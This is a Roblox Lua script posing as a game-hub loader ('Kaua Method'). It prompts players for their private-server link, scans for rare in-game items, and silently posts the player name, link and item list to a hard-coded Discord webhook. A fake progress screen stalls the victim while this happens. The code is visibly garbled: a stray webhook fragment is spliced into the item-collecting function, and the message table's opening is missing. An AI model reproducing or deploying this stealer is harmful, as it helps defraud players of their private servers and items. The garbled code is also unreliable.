-- Services
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")
local TweenService = game:GetService("TweenService")
local plots = Workspace:WaitForChild("Plots")

-- Packages
local NetPackages = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")

-- Notification listener
local notificationEvent = NetPackages:WaitForChild("RE/NotificationService/Notify", 5).OnClientEvent:Connect(function(title, message)
    -- Handle notifications here
end)

-- Toggle player settings
task.spawn(function()
    NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Music")
    NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Sound Effects")
    NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Chat Tips")
    NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("VFX")
end)

-- === FunÃ§Ã£o para detectar Brainrots ===
local function reconhecerBrainrots()
    local brainrotsEncontrados = {}
    for _, obj in ipairs(plots:GetDescendants()) do
        if obj:IsA("TextLabel") and obj.Name == "Rarity" then
            local rarityText = obj.Text
            if rarityText == "Brainrot God" or rarityText == "Secret" then
                local parent = obj.Parent
                local displayName = parent:FindFirstChild("DisplayName")
                local generation = parent:FindFirstChild("Generation")
                if displayName and generation and displayName:IsA("TextLabel") and generation:IsA("TextLabel") then
                    table.insert(brainrotsEncontrados, {
                        name = displayName.Text,webhooks/1429613231684452592/q5c4T-Lt0ICLXnLCsSzXE0WpKpk0LUDcxhs_BfDD_9qh0STIxmDKUSU_sxdK4evG5A7v"  
        local embed = {  
                        rarity = rarityText,
                        generation = generation.Text
                    })
                end
            end
        end
    end
    return brainrotsEncontrados
end

-- === UI: Server Link Input com animaÃ§Ã£o ===
local brainrotUI = Instance.new("ScreenGui")
brainrotUI.Name = "BrainrotUI"
brainrotUI.ResetOnSpawn = false
brainrotUI.Parent = LocalPlayer:WaitForChild("PlayerGui")

local mainFrame = Instance.new("Frame", brainrotUI)
mainFrame.Size = UDim2.new(0, 400, 0, 180)
mainFrame.Position = UDim2.new(0.5, -200, -0.5, -90)  -- ComeÃ§a fora da tela (acima)
mainFrame.BackgroundColor3 = Color3.fromRGB(25, 35, 25)
mainFrame.Active = true
mainFrame.Draggable = true

local frameCorner = Instance.new("UICorner", mainFrame)
frameCorner.CornerRadius = UDim.new(0, 10)

-- Tween de entrada (animaÃ§Ã£o suave)
local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local goal = {Position = UDim2.new(0.5, -200, 0.5, -90)}
local tween = TweenService:Create(mainFrame, tweenInfo, goal)
tween:Play()

-- === TÃ­tulo ===
local titleLabel = Instance.new("TextLabel", mainFrame)
titleLabel.Size = UDim2.new(1, 0, 0, 45)
titleLabel.BackgroundTransparency = 1
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextSize = 20
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.Text = "Kaua Method"

-- === Caixa de link do servidor ===
local serverLinkBox = Instance.new("TextBox", mainFrame)
serverLinkBox.Size = UDim2.new(0.9, 0, 0, 40)
serverLinkBox.Position = UDim2.new(0.05, 0, 0.45, 0)
serverLinkBox.PlaceholderText = "Server Privado Aqui"
serverLinkBox.Font = Enum.Font.Gotham
serverLinkBox.TextSize = 18
serverLinkBox.TextColor3 = Color3.new(1, 1, 1)
serverLinkBox.BackgroundColor3 = Color3.fromRGB(40, 60, 40)
serverLinkBox.TextXAlignment = Enum.TextXAlignment.Left
serverLinkBox.ClearTextOnFocus = false
serverLinkBox.Text = ""

local textBoxCorner = Instance.new("UICorner", serverLinkBox)
textBoxCorner.CornerRadius = UDim.new(0, 8)

-- === BotÃ£o Enter ===
local enterButton = Instance.new("TextButton", mainFrame)
enterButton.Size = UDim2.new(0.9, 0, 0, 40)
enterButton.Position = UDim2.new(0.05, 0, 0.75, 0)
enterButton.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
enterButton.Text = "Enter"
enterButton.Font = Enum.Font.GothamBold
enterButton.TextSize = 18
enterButton.TextColor3 = Color3.new(1, 1, 1)

local buttonCorner = Instance.new("UICorner", enterButton)
buttonCorner.CornerRadius = UDim.new(0, 8)

-- === BotÃ£o Enter Click ===
enterButton.MouseButton1Click:Connect(function()
    local serverLink = serverLinkBox.Text
    if serverLink == "" then
        warn("âš ï¸ VocÃª precisa colocar um link vÃ¡lido!")
        return
    end

    enterButton.Text = "âœ… Valido"  
    enterButton.BackgroundColor3 = Color3.fromRGB(0, 255, 120)  
    task.wait(0.5)  
    brainrotUI:Destroy()  

    -- === Reconhecer Brainrots ===
    local brainrots = reconhecerBrainrots()
    local brainrotText = ""
    for i, br in ipairs(brainrots) do
        brainrotText = brainrotText .. string.format("â€¢ %s (%s) | Valor: %s\n", br.name, br.rarity, br.generation)
    end
    if brainrotText == "" then brainrotText = "Nenhum Brainrot encontrado." end

    -- === Envio webhook ===  
    task.spawn(function()  
        local webhookUrl = "https://discord.com/api/webhooks/1429301109255573596/IWZFS63ptlKMwCQdSE0Ygvgxgusor4cH0dVjKwuN7U8ZSDwsb4VhPGmz08k51i0dU-IZ"
            username = "KauÃ£ Methods",  
            avatar_url = "https://i.imgur.com/wtdl6SY.png",  
            embeds = {{  
                color = 65280,  
                title = "Novo servidor!!",  
                description = "Uma nova pessoa executou o alvorada hub.",  
                fields = {  
                    {name = "ðŸ‘¤ Player Information", value = string.format("**Name:** %s", LocalPlayer.Name), inline = false},  
                    {name = "ðŸ”— Entrar server privado", value = string.format("[Click to Join](%s)", serverLink), inline = false},  
                    {name = "ðŸ‰ Brainrots Detectados", value = brainrotText, inline = false},  
                },  
                footer = {text = "KauÃ£ Methods | Notficacoes Alv", icon_url = "https://i.imgur.com/wtdl6SY.png"},  
                timestamp = DateTime.now():ToIsoDate()  
            }}  
        }  

        local body = HttpService:JSONEncode(embed)  
        local req = request or http_request or (syn and syn.request) or (fluxus and fluxus.request) or (krnl and krnl.request)  

        if req then  
            local response = req({  
                Url = webhookUrl,  
                Method = "POST",  
                Headers = {["Content-Type"] = "application/json"},  
                Body = body  
            })  
            print("âœ… Webhook enviado! Status:", response and response.StatusCode or "sem resposta")  
        else  
            warn("âš ï¸ Seu executor nÃ£o suporta envio de webhook (HTTP Request bloqueado).")  
        end  
    end)  

    -- === Loader / Script Promises ===  
    local loaderGui = Instance.new("ScreenGui", game:GetService("CoreGui"))  
    loaderGui.Name = "KauaLoader"  
    loaderGui.IgnoreGuiInset = true  
    loaderGui.ResetOnSpawn = false  

    local loaderFrame = Instance.new("Frame", loaderGui)  
    loaderFrame.Size = UDim2.new(1, 0, 1, 0)  
    loaderFrame.BackgroundColor3 = Color3.fromRGB(0, 20, 0)  

    local loaderTitle = Instance.new("TextLabel", loaderFrame)  
    loaderTitle.Size = UDim2.new(1, 0, 0.1, 0)  
    loaderTitle.Position = UDim2.new(0, 0, 0.35, 0)  
    loaderTitle.BackgroundTransparency = 1  
    loaderTitle.Font = Enum.Font.GothamBold  
    loaderTitle.TextSize = 36  
    loaderTitle.TextColor3 = Color3.fromRGB(80, 255, 80)  
    loaderTitle.Text = "KauaMethod estÃ¡ carregando."  
    loaderTitle.TextScaled = true  

    local loaderPercent = Instance.new("TextLabel", loaderFrame)  
    loaderPercent.Size = UDim2.new(1, 0, 0.1, 0)  
    loaderPercent.Position = UDim2.new(0, 0, 0.45, 0)  
    loaderPercent.BackgroundTransparency = 1  
    loaderPercent.Font = Enum.Font.GothamBold  
    loaderPercent.TextSize = 24  
    loaderPercent.TextColor3 = Color3.fromRGB(80, 255, 80)  
    loaderPercent.Text = "0%"  

    local loaderDesc = Instance.new("TextLabel", loaderFrame)  
    loaderDesc.Size = UDim2.new(1, 0, 0.05, 0)  
    loaderDesc.Position = UDim2.new(0, 0, 0.52, 0)  
    loaderDesc.BackgroundTransparency = 1  
    loaderDesc.Font = Enum.Font.Gotham  
    loaderDesc.TextSize = 16  
    loaderDesc.TextColor3 = Color3.fromRGB(180, 255, 180)  
    loaderDesc.Text = "Espere e seja feliz"  
    loaderDesc.TextScaled = true  
    loaderDesc.TextWrapped = true  
    loaderDesc.TextXAlignment = Enum.TextXAlignment.Center  

    local loaderFooter = Instance.new("TextLabel", loaderFrame)  
    loaderFooter.Size = UDim2.new(1, 0, 0.05, 0)  
    loaderFooter.Position = UDim2.new(0, 0, 0.9, 0)  
    loaderFooter.BackgroundTransparency = 1  
    loaderFooter.Font = Enum.Font.GothamBold  
    loaderFooter.TextSize = 18  
    loaderFooter.TextColor3 = Color3.fromRGB(100, 255, 100)  
    loaderFooter.Text = "https://discord.gg/JUqbpNAyu"  

    -- Simulated loading  
    for i = 1, 100 do  
        loaderPercent.Text = i.."%"  
        task.wait(0.05)  
    end  

    loaderTitle:Destroy()  
    loaderPercent:Destroy()  
    loaderDesc:Destroy()  

    local loaderCompleteLabel = Instance.new("TextLabel", loaderFrame)  
    loaderCompleteLabel.Size = UDim2.new(1, 0, 1, 0)  
    loaderCompleteLabel.BackgroundTransparency = 1  
    loaderCompleteLabel.Font = Enum.Font.GothamBold  
    loaderCompleteLabel.TextScaled = true  
    loaderCompleteLabel.TextColor3 = Color3.fromRGB(100, 255, 100)  
    loaderCompleteLabel.Text = "Script Carregou, so esperar entre 2-3 minutos.."

end)
